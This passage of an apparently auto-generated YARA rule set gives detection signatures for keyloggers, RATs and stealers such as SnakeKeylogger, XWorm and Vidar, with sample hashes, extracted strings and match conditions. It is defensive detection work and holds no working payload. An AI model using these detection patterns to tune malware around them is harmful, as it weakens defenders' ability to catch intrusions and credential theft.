      $s5 = "GetDateOfNNDS*ProcessDateTimeSuffix" fullword ascii /* score: '20.00'*/
      $s6 = "&GetFieldBypassCctor&SetFieldBypassCctor@" fullword ascii /* score: '20.00'*/
      $s7 = "HDateTimeOffsetTimeZonePostProcessing" fullword ascii /* score: '20.00'*/
      $s8 = "\"get_ClockDateTime8System.IComparable.CompareTo" fullword ascii /* score: '19.00'*/
      $s9 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Object>>.get_Current@" fullword ascii /* score: '18.00'*/
      $s10 = "XSystem.Collections.IDictionary.GetEnumerator`System.Collections.IDictionaryEnumerator.get_KeydSystem.Collections.IDictionaryEnu" ascii /* score: '18.00'*/
      $s11 = "XSystem.Collections.IDictionary.GetEnumerator`System.Collections.IDictionaryEnumerator.get_KeydSystem.Collections.IDictionaryEnu" ascii /* score: '18.00'*/
      $s12 = "PSystem.Collections.ICollection.get_CountBSystem.Collections.IList.get_Item8System.Collections.IList.Add@" fullword ascii /* score: '18.00'*/
      $s13 = "HSystem.Collections.IComparer.Compare@" fullword ascii /* score: '17.00'*/
      $s14 = "$GetEmptyEnumerator" fullword ascii /* score: '16.00'*/
      $s15 = "VerifyIntegrityjSystem.Collections.Generic.IEnumerator<U>.get_CurrentnSystem.Collections.Generic.IEnumerable<U>.GetEnumerator@" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c_17 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash3 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash4 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash5 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash6 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
   strings:
      $x1 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x2 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x4 = "System.Diagnostics.FileVersionInfo, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3avFxResources.System.Diagnos" ascii /* score: '31.00'*/
      $x5 = "System.Diagnostics.FileVersionInfo, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3avFxResources.System.Diagnos" ascii /* score: '31.00'*/
      $s6 = "System.CodeDom8Microsoft.Win32.SystemEvents\"SafeProcessHandle" fullword ascii /* score: '27.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s8 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s9 = "System.Threading.Tasks.ITaskCompletionAction.get_InvokeMayRunArbitraryCode@" fullword ascii /* score: '22.00'*/
      $s10 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s11 = "TargetDetailsFLockFreeReaderHashtableOfPointers`2" fullword ascii /* score: '20.00'*/
      $s12 = "System.Runtime.CompilerService" fullword wide /* score: '20.00'*/
      $s13 = ",System.ObjectModel.dllFSystem.ComponentModel.TypeConverter" fullword ascii /* score: '19.00'*/
      $s14 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s15 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__799e73863806df2964d80d12ce4e61ea_imphash__SnakeKeylogger_signature__9154058d1dfc0a0203928a4ed25ab_18 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
      hash2 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash3 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash4 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash5 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "QueueTask(TryExecuteTaskInline2GetTaskForValueTaskSource@" fullword ascii /* score: '23.00'*/
      $s5 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s6 = "BResolveGenericVirtualMethodTargetBGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '20.00'*/
      $s7 = "icu.dll" fullword wide /* score: '20.00'*/
      $s8 = "FileVersionInfo\"ProcessWaitHandle4SYSTEM_PROCESS_INFORMATIONS" fullword ascii /* score: '18.00'*/
      $s9 = ".ThrowForFailedGetResult SignalCompletionnSystem.Collections.Generic.IEnumerable<T>.GetEnumerator@" fullword ascii /* score: '18.00'*/
      $s10 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s11 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s12 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s13 = "0ExecutionContextCallback$get_MoveNextAction@" fullword ascii /* score: '17.00'*/
      $s14 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s15 = "TargetDetails4ExceptionTypeNameFormatter\"TypeNameFormatter6RuntimeGenericParameterDesc" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__1187c976_XWorm_signature__2d36d41b_XWorm_signature__a615e226_19 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_1187c976.vbs, XWorm(signature)_2d36d41b.vbs, XWorm(signature)_a615e226.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1187c9766193dbf94479fa30fe7153bf58e5536f0b58fcd6c3d489b714f18274"
      hash2 = "2d36d41bbb94ff256959e5dd4ae6839fade74339f64568a0809667565e8a8d61"
      hash3 = "a615e2263defb4a330c73b8f332db82e16f2f98bd6961c03b617db9a221e3d46"
   strings:
      $s1 = "    set matches = regExpObj.Execute(target)" fullword ascii /* score: '26.00'*/
      $s2 = "                        'skip all double-prefix parameters - assumed for scripting host i.e. //nologo" fullword ascii /* score: '23.00'*/
      $s3 = "            'process the command line segment" fullword ascii /* score: '18.00'*/
      $s4 = "            For index = m_commandIndex To m_commandLineParser.UnnamedCount - 1" fullword ascii /* score: '15.00'*/
      $s5 = "        analysisInputXml =  \"<Analyze_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"><Transport>" ascii /* score: '15.00'*/
      $s6 = "            For index = 0 To m_commandLineParser.UnnamedCount - 1" fullword ascii /* score: '15.00'*/
      $s7 = "    msxmlObj.setproperty \"SelectionNamespaces\", \"xmlns:s=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"\" " fullword ascii /* score: '15.00'*/
      $s8 = "        analysisInputXml =  \"<Analyze_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"><Transport>" ascii /* score: '15.00'*/
      $s9 = "        analysisInputXml = \"<AnalyzeService_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"></Anal" ascii /* score: '15.00'*/
      $s10 = "        analysisInputXml = \"<AnalyzeService_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"></Anal" ascii /* score: '15.00'*/
      $s11 = "        For index = 0 To m_commandLineParser.NamedCount - 1" fullword ascii /* score: '15.00'*/
      $s12 = "        analysisInputXml = \"<Analyze_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"><Transport>\"" ascii /* score: '15.00'*/
      $s13 = "        analysisInputXml = \"<Analyze_INPUT xmlns=\"\"http://schemas.microsoft.com/wbem/wsman/1/config/service\"\"><Transport>\"" ascii /* score: '15.00'*/
      $s14 = "        unnamedCount = m_commandLineParser.UnnamedCount - m_commandIndex" fullword ascii /* score: '15.00'*/
      $s15 = "            FORMAT_XSL_PATH = WSHShell.ExpandEnvironmentStrings(\"%systemroot%\\syswow64\\\")" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x0d27 or uint16(0) == 0x7270 ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c_20 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash3 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash4 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash5 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
   strings:
      $s1 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s2 = "System.dll$System.Collections" fullword ascii /* score: '22.00'*/
      $s3 = "XSystem.Collections.IEnumerable.GetEnumerator\"CopyStringContent" fullword ascii /* score: '20.00'*/
      $s4 = "@System.Security.Cryptography.dll System.Threading" fullword ascii /* score: '19.00'*/
      $s5 = ",System.Collections.dll:System.Collections.Concurrent" fullword ascii /* score: '19.00'*/
      $s6 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType&TryGetMethodInvoker@" fullword ascii /* score: '18.00'*/
      $s7 = ",OnFirstChanceException(OnUnhandledException\"get_BaseDirectory.get_TargetFrameworkName" fullword ascii /* score: '17.00'*/
      $s8 = "ChangeType operation is not supported" fullword wide /* score: '17.00'*/
      $s9 = "`ReflectionExecutionDomainCallbacksImplementation MethodInvokeInfo" fullword ascii /* score: '16.00'*/
      $s10 = "GetEmptyIfEmpty" fullword ascii /* score: '16.00'*/
      $s11 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheckBMethodInvokerWithMethodInvokeInfo*InstanceMethodInvoker" fullword ascii /* score: '16.00'*/
      $s12 = "*ProcessorArchitecture&AssemblyContentType\"AssemblyNameFlags" fullword ascii /* score: '16.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<System.Reflection.FieldInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerator<System.Reflection.CustomAttributeData>.get_Current@" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__190eb263_XWorm_signature__26211361_XWorm_signature__4127f6aa_XWorm_signature__792e8d01_XWorm_signature__83_21 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_190eb263.js, XWorm(signature)_26211361.js, XWorm(signature)_4127f6aa.js, XWorm(signature)_792e8d01.js, XWorm(signature)_831283e7.js, XWorm(signature)_9ea8b992.js, XWorm(signature)_bd7888bf.js, XWorm(signature)_c59c9657.js, XWorm(signature)_f4810d3c.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "190eb263841bdf3c0c8354cad7c91c16f0d87c714d20514db006e86af8ca7352"
      hash2 = "26211361adb6bdf66622593f67bf9c3db22f1182929060c43794f0ad86a52f69"
      hash3 = "4127f6aab61f9543b297912a54b7bdff44b05957b8b6ec9b1c21714c6ebb5eb6"
      hash4 = "792e8d0157b15fc171b5734723d7be2e692455b8f53126f8dd20e832084dc59a"
      hash5 = "831283e7b48ebf5212aa89937e17e5d00ca27edee222b03d140e56638bf69a9e"
      hash6 = "9ea8b992ef9b032252e18c5a146ab85ff951b2f7c5da56497eea3024bd66aedc"
      hash7 = "bd7888bf9d976111d6aedfa98e3946ba1e67be4221c63dbb6ee05e50c71ca2bb"
      hash8 = "c59c96572a773bd3121d9e4a8b709c87fc3a50d490037a501636b46a503da072"
      hash9 = "f4810d3cb3a1fa36845d4ac86b7dff3f05811e7090c21cc23091a891db7a0843"
   strings:
      $s1 = "iframe.src=\"javascript:\";" fullword ascii /* score: '25.00'*/
      $s2 = "var compliantExecNpcg=/()??/.exec(\"\")[1]===void 0;" fullword ascii /* score: '23.00'*/
      $s3 = "descriptor.get=getter;" fullword ascii /* score: '21.00'*/
      $s4 = "if(!compliantExecNpcg){" fullword ascii /* score: '19.00'*/
      $s5 = "if(!compliantExecNpcg&&match.length>1){" fullword ascii /* score: '19.00'*/
      $s6 = "Object.getOwnPropertyDescriptor=function(object,property){" fullword ascii /* score: '18.00'*/
      $s7 = "defineGetter(object,property,descriptor.get);" fullword ascii /* score: '18.00'*/
      $s8 = "Empty.prototype=target.prototype;" fullword ascii /* score: '17.00'*/
      $s9 = "throw new TypeError(ERR_NON_OBJECT_TARGET+object);" fullword ascii /* score: '17.00'*/
      $s10 = "var boundLength=Math.max(0,target.length-args.length);" fullword ascii /* score: '17.00'*/
      $s11 = "while(match=separator.exec(string)){" fullword ascii /* score: '16.00'*/
      $s12 = "throw new TypeError(\"Function.prototype.bind called on incompatible \"+target);" fullword ascii /* score: '16.00'*/
      $s13 = "var match=isoDateExpression.exec(string);" fullword ascii /* score: '16.00'*/
      $s14 = "descriptor.set=setter;" fullword ascii /* score: '16.00'*/
      $s15 = "var getOwnPropertyDescriptorFallback=Object.getOwnPropertyDescriptor;}}" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x2a2f or uint16(0) == 0x0a0d ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4ac3f32b_VIPKeylogger_signature__f34d5f2d4577ed6d9ceec5_22 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4ac3f32b.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a4220a67.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfff0207.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_92d99c4f.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ee3169ff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4ac3f32b582acab1a8cd4db11290c46427621b0d0c1fbe3ee042c7c2f63140da"
      hash2 = "a4220a67a386837f6d43ff34356bbdee7dbd33da1c35957801630f344f5d388a"
      hash3 = "dfff02076554af2576fd4b55b593d4923e19d7a5b0596ca4162c9101bed25691"
      hash4 = "92d99c4f72097b0f2e956f4b0f7dcbb25cd8c7dccaf24be2c7120774c70d42f5"
      hash5 = "ee3169ffaf363d6d5c5a18f65fb771508f899d67f1d6dc1d13e2cd40ada518bf"
   strings:
      $x1 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii /* score: '32.00'*/
      $x2 = "561934e089rSystem.Drawing.ContentAlignment, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPA" fullword ascii /* score: '32.00'*/
      $s3 = "wSystem.Windows.Forms.MenuStrip, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s4 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii /* score: '27.00'*/
      $s5 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s6 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii /* score: '27.00'*/
      $s7 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s8 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii /* score: '27.00'*/
      $s9 = "System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, S" ascii /* score: '27.00'*/
      $s10 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Size, Sy" ascii /* score: '27.00'*/
      $s11 = "System.Windows.Forms.ToolStripMenuItem, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089F" ascii /* score: '27.00'*/
      $s12 = "stem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Font, System.Drawing, Version=4.0" ascii /* score: '27.00'*/
      $s13 = "blicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.Padding, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyTok" ascii /* score: '24.00'*/
      $s14 = ".0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.Padding, System.Windows.Forms, Version=4.0.0.0, Cult" ascii /* score: '24.00'*/
      $s15 = ".0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, Pu" ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _XWorm_signature__2b39a59ef6bff544a0dc4af77e9defab_imphash__XWorm_signature__2b39a59ef6bff544a0dc4af77e9defab_imphash__33363_23 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_2b39a59ef6bff544a0dc4af77e9defab(imphash).exe, XWorm(signature)_2b39a59ef6bff544a0dc4af77e9defab(imphash)_33363b77.exe, XWorm(signature)_2b39a59ef6bff544a0dc4af77e9defab(imphash)_ec7f2a2c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f0dc0c602c2280645733acd8b90b1ca655a45f2908de98c7073676c0a57400ad"
      hash2 = "33363b7749a5b0be21743c04436d97831ba98c7f4aaaddfc1c07808a7d673c8f"
      hash3 = "ec7f2a2cf2d7fd795b8bbcbbc91e825415af66ee31edd6026d384390140dbbb1"
   strings:
      $s1 = "</dc:creator></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:tiff=\"http://ns.a" ascii /* score: '28.00'*/
      $s2 = "http://ns.microsoft.com/photo/1.0\"><MicrosoftPhoto:Rating>50</MicrosoftPhoto:Rating></rdf:Description><rdf:Description rdf:abou" ascii /* score: '28.00'*/
      $s3 = "</tiff:copyright></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:MicrosoftPhoto" ascii /* score: '28.00'*/
      $s4 = "n><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:exif=\"http://ns.adobe.com/exif/1.0/\"><exif:Da" ascii /* score: '23.00'*/
      $s5 = "=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:Rating>3</xmp:Rating></rdf:Descri" ascii /* score: '23.00'*/
      $s6 = "8C:\\Users\\Secure\\Desktop\\Trillium Project Programs and Sourcecodes\\REGISTRATOR\\MSCAL.oca" fullword ascii /* score: '20.00'*/
      $s7 = "aC:\\PROGRA~2\\CODEJO~1\\ActiveX\\XTREME~1.1\\Bin\\COB3F7~1.oca" fullword ascii /* score: '19.00'*/
      $s8 = "VB5!6&VB6DE.DLL" fullword ascii /* score: '17.00'*/
      $s9 = "Xhttp://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s10 = "e.com/tiff/1.0/\"><tiff:artist>Peter Lilja</tiff:artist><tiff:copyright><rdf:Alt xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-sy" ascii /* score: '17.00'*/
      $s11 = "<xmp:xmpmeta xmlns:xmp=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rd" ascii /* score: '16.00'*/
      $s12 = "<xmp:xmpmeta xmlns:xmp=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rd" ascii /* score: '16.00'*/
      $s13 = "\\MSINFO32.EXE" fullword wide /* score: '16.00'*/
      $s14 = "</tiff:copyright></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:MicrosoftPhoto" ascii /* score: '15.00'*/
      $s15 = "m2Ca7eW9Q.exe" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "2b39a59ef6bff544a0dc4af77e9defab" and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Vidar_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__24 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23b2938d3c84a2157ba0a8347c1b62cf3f05dd5eaf53ddcea431efe6434c2074"
      hash2 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s2 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s3 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s5 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s6 = "ReaderAt" fullword ascii /* score: '12.00'*/
      $s7 = "os/executable.go" fullword ascii /* score: '12.00'*/
      $s8 = "os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s9 = "os/exec_windows.go" fullword ascii /* score: '12.00'*/
      $s10 = "*io.ReaderAt" fullword ascii /* score: '12.00'*/
      $s11 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s12 = "encoding/binary.dataSize" fullword ascii /* score: '11.00'*/
      $s13 = "erroring" fullword ascii /* score: '11.00'*/
      $s14 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s15 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ThemeForestRAT_signature__ValleyRAT_signature__4ec49a2ae0bc55ef007832a0fcb7b1dd_imphash__25 {
   meta:
      description = "_subset_batch - from files ThemeForestRAT(signature).elf, ValleyRAT(signature)_4ec49a2ae0bc55ef007832a0fcb7b1dd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ff32bc1c756d560d8a9815db458f438d63b1dcb7e9930ef5b8639a55fa7762c9"
      hash2 = "39aa0ffe47f3f571a263111963c61863b88614ac0fd43118bb2abbdcaa1ec4ff"
   strings:
      $s1 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s2 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s3 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s4 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s5 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s6 = "Excessive password length for proxy auth" fullword ascii /* score: '15.00'*/
      $s7 = "Unsupported proxy scheme for '%s'" fullword ascii /* score: '13.00'*/
      $s8 = "SOCKS5: connecting to HTTP proxy %s port %d" fullword ascii /* score: '13.00'*/
      $s9 = "Unsupported proxy syntax in '%s'" fullword ascii /* score: '13.00'*/
      $s10 = "Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support." fullword ascii /* score: '13.00'*/
      $s11 = "Connection closure while negotiating auth (HTTP 1.0?)" fullword ascii /* score: '13.00'*/
      $s12 = "oversized cookie dropped, name/val %zu + %zu bytes" fullword ascii /* score: '13.00'*/
      $s13 = " public key hash: sha256//%s" fullword ascii /* score: '13.00'*/
      $s14 = "TFTP error: %s" fullword ascii /* score: '12.00'*/
      $s15 = "operation aborted by trailing headers callback" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 8000KB and pe.imphash() == "4ec49a2ae0bc55ef007832a0fcb7b1dd" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__326bcb84_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_26 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_326bcb84.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5363b10f.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_56f83bfe.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_79ee7e34.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_80137ada.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8d9f89a3.exe"
      author = "Metin Yigit"
